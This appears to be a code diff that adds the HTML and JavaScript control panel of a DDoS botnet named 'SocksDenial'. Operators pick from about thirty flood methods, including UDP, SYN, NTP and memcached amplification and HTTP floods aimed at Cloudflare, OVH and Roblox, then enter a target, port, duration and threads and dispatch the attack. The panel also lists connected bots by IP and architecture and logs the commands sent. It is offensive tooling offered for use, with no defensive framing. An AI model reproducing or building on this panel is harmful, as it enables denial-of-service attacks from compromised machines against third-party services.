@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html><head><title>SocksDenial</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=stylesheet href=/panel.css>
+</head><body>
+<div class=sidebar>
+<h2>SocksDenial</h2>
+<a href=#panel id=lnk-panel class=active onclick="return showSection('panel')">Panel</a>
+<a href=#bots id=lnk-bots onclick="return showSection('bots')">Bots</a>
+<div class=spacer></div>
+<a href=/logout class=logout>Logout</a>
+</div>
+<div class=main>
+
+<div id=section-panel>
+<div class=panel-layout>
+<div class=card>
+<h1>Send Command</h1>
+<form id=cmdForm onsubmit='return sendCmd(event)'>
+<div class=form-grid>
+<div class=full>
+<label>Method</label>
+<select id=method onchange=updateForm()>
+<option value=.UDP>UDP</option>
+<option value=.TCP>TCP</option>
+<option value=.SYN>SYN</option>
+<option value=.TUP>TUP</option>
+<option value=.HEX>HEX</option>
+<option value=.JUNK>JUNK</option>
+<option value=.NTP>NTP</option>
+<option value=.MEM>MEM</option>
+<option value=.ICMP>ICMP</option>
+<option value=.POD>POD</option>
+<option value=.VSE>VSE</option>
+<option value=.ROBLOX>ROBLOX</option>
+<option value=.UDP-PLAIN>UDP-PLAIN</option>
+<option value=.UDP-PPS>UDP-PPS</option>
+<option value=.UDP-GIGS selected>UDP-GIGS</option>
+<option value=.PPS-HAMMER>PPS-HAMMER</option>
+<option value=.HTTPSTORM>HTTPSTORM</option>
+<option value=.HTTPGET>HTTPGET</option>
+<option value=.HTTPCFB>HTTPCFB</option>
+<option value=.HTTPIO>HTTPIO</option>
+<option value=.HTTPSPOOF>HTTPSPOOF</option>
+<option value=.HTTP2-RAW>HTTP2-RAW</option>
+<option value=.STDHEX>STDHEX</option>
+<option value=.STD>STD</option>
+<option value=.NFODROP>NFODROP</option>
+<option value=.OVHKILL>OVHKILL</option>
+<option value=.XMAS>XMAS</option>
+<option value=.SYNFLOOD>SYNFLOOD</option>
+<option value=.RST>RST</option>
+</select>
+</div>
+<div id=fg-target>
+<label>Target</label>
+<input type=text id=target placeholder='IP address or URL'>
+</div>
+<div id=fg-port>
+<label>Port</label>
+<input type=text id=port placeholder='e.g. 80'>
+</div>
+<div id=fg-time>
+<label>Time (seconds)</label>
+<input type=text id=time placeholder='e.g. 60'>
+</div>
+<div id=fg-threads>
+<label>Threads</label>
+<input type=text id=threads placeholder='e.g. 10'>
+</div>
+<div id=fg-size>
+<label>Packet Size</label>
+<input type=text id=size placeholder='e.g. 1024'>
+</div>
+<div id=fg-extra class=full>
+<label>Extra</label>
+<input type=text id=extra placeholder='e.g. attack type for HTTPIO'>
+</div>
+</div>
+<button type=submit class="btn btn-primary">Execute</button>
+</form>
+<button class="btn btn-danger" onclick=stopAll()>Stop All Attacks</button>
+<div class=st id=st>Ready</div>
+</div>
+<div class="card history-card">
+<h1>History</h1>
+<div id=history-list>Loading...</div>
+</div>
+</div>
+</div>
+
+<div id=section-bots style=display:none>
+<div class=card style=max-width:none>
+<h1>Connected Bots <span id=bc>({BOT_COUNT})</span></h1>
+<table>
+<tr><th>ID</th><th>IP Address</th><th>Architecture</th></tr>
+{BOT_ROWS}
+</table>
+</div>
+</div>
+
+</div>
+<script>
+var methodOrder={
+'.UDP':['target','port','time','size'],
+'.TCP':['target','port','time','size'],
+'.SYN':['target','port','time'],
+'.TUP':['target','port','time','size'],
+'.HEX':['target','port','time'],
+'.JUNK':['target','port','time','size'],
+'.NTP':['target','port','time'],
+'.MEM':['target','port','time'],
+'.ICMP':['target','time'],
+'.POD':['target','time'],
+'.VSE':['target','port','time'],
+'.ROBLOX':['target','port','time','size'],
+'.UDP-PLAIN':['target','port','time','threads'],
+'.UDP-PPS':['target','time','threads'],
+'.UDP-GIGS':['target','port','time','threads'],
+'.PPS-HAMMER':['target','port','time','threads'],
+'.HTTPSTORM':['target','port','time'],
+'.HTTPIO':['target','time','threads','extra'],
+'.HTTPCFB':['target','port','time'],
+'.HTTPGET':['target','port','time'],
+'.HTTPSPOOF':['target','time'],
+'.HTTP2-RAW':['target','time','threads'],
+'.STDHEX':['target','port','time','threads'],
+'.STD':['target','port','time','threads'],
+'.NFODROP':['target','port','time','threads'],
+'.OVHKILL':['target','port','time','threads'],
+'.XMAS':['target','port','time','threads','size'],
+'.SYNFLOOD':['target','port','time','threads'],
+'.RST':['target','port','time','threads']
+};
+var allFields=['target','port','time','threads','size','extra'];
+function updateForm(){var m=document.getElementById('method').value;
+var order=methodOrder[m]||['target','time'];
+for(var i=0;i<allFields.length;i++){
+var f=allFields[i];
+var el=document.getElementById('fg-'+f);
+el.style.display=order.indexOf(f)>=0?'':'none'}}
+function getVal(id){return document.getElementById(id).value.trim()}
+function sendCmd(e){e.preventDefault();
+var m=document.getElementById('method').value;
+var order=methodOrder[m]||['target','time'];
+var parts=[m];
+for(var i=0;i<order.length;i++){
+var v=getVal(order[i]);
+if(v)parts.push(v)}
+if(parts.length<2){setStatus('Target required');return false}
+cmd(parts.join(' '));return false}
+function stopAll(){setStatus('Stopping...');
+fetch('/stop-all',{method:'POST'})
+.then(function(r){return r.json()}).then(function(d){setStatus(d.message)})
+.catch(function(e){setStatus('Error: '+e)})}
+function cmd(c){setStatus('Sending...');
+fetch('/command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
+body:'c='+encodeURIComponent(c)})
+.then(function(r){return r.json()}).then(function(d){setStatus(d.message)})
+.catch(function(e){setStatus('Error: '+e)})}
+function setStatus(m){document.getElementById('st').textContent=m}
+function showSection(s){
+['panel','bots'].forEach(function(x){
+document.getElementById('section-'+x).style.display=x===s?'':'none';
+document.getElementById('lnk-'+x).className=x===s?'active':''});
+return false}
+updateForm();
+setInterval(function(){fetch('/api/bots').then(function(r){return r.json()})
+.then(function(d){
+var t=document.querySelector('#section-bots table');
+if(!t)return;
+while(t.rows.length>1)t.deleteRow(1);
+for(var i=0;i<d.bots.length;i++){var r=t.insertRow();
+r.insertCell().textContent=d.bots[i].id;
+r.insertCell().textContent=d.bots[i].ip;
+r.insertCell().textContent=d.bots[i].arch}
+document.getElementById('bc').textContent='('+d.count+')'})
+.catch(function(){})},3000);
+var _isAdmin=false;
+function loadHistory(){
+fetch('/api/history').then(function(r){return r.json()}).then(function(d){
+var el=document.getElementById('history-list');if(!el)return;
+var h=d.history||[];
+if(!h.length){el.textContent='No history';return}
+var html='<table class=hist><tr><th>Time</th>'+
+(_isAdmin?'<th>User</th>':'')+'<th>Command</th></tr>';
+for(var i=0;i<h.length;i++){
+html+='<tr><td class=ht>'+h[i].time+'</td>'+
+(_isAdmin?'<td class=hu>'+h[i].user+'</td>':'')+
+'<td class=hc>'+h[i].command+'</td></tr>'}
+el.innerHTML=html}).catch(function(){})}
+fetch('/api/me').then(function(r){return r.json()}).then(function(d){
+_isAdmin=d.admin;loadHistory()}).catch(function(){});
+setInterval(loadHistory,5000);
+(function(){
+var p=location.pathname.replace(/\/$/,'');
+var h=(location.hash||'#panel').slice(1);
+var s=p==='/bots'?'bots':h;
+if(s==='bots')showSection('bots')})();
+</script></body></html>
